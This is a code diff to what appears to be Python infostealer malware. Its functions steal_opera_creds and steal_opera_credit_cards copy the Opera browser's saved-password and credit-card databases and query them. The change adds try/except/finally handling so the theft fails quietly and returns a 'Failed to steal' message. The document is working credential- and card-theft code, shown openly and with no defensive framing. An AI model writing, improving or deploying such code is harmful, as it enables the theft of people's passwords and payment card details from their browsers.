@@ -96,16 +96,24 @@ def __get_opera_credit_cards(cur):
 
 
 def steal_opera_creds(): # get opera credentials
-    __copy_db_file(__OPERA_CREDS_ORIGINAL_FILE, __OPERA_CREDS_COPY_FILE)
-    con, cur = __open_db_connection(__OPERA_CREDS_COPY_FILE)
-    opera_creds = __get_opera_creds(cur)
-    con.close() # Close SQLite3 connection
-    return opera_creds
+    try:
+        __copy_db_file(__OPERA_CREDS_ORIGINAL_FILE, __OPERA_CREDS_COPY_FILE)
+        con, cur = __open_db_connection(__OPERA_CREDS_COPY_FILE)
+        opera_creds = __get_opera_creds(cur)
+        con.close() # Close SQLite3 connection
+    except:
+        opera_creds = "Failed to steal opera creds"
+    finally:
+        return opera_creds
 
 
 def steal_opera_credit_cards(): # get opera credit cards
-    __copy_db_file(__OPERA_CREDIT_CARDS_FILE, __OPERA_CREDIT_CARDS_COPY_FILE)
-    con, cur = __open_db_connection(__OPERA_CREDIT_CARDS_COPY_FILE)
-    credit_cards = __get_opera_credit_cards(cur)
-    con.close() # Close SQLite3 connection
-    return credit_cards
+    try:
+        __copy_db_file(__OPERA_CREDIT_CARDS_FILE, __OPERA_CREDIT_CARDS_COPY_FILE)
+        con, cur = __open_db_connection(__OPERA_CREDIT_CARDS_COPY_FILE)
+        credit_cards = __get_opera_credit_cards(cur)
+        con.close() # Close SQLite3 connection
+    except:
+        credit_cards = "Failed to steal opera credit cards"
+    finally:
+        return credit_cards
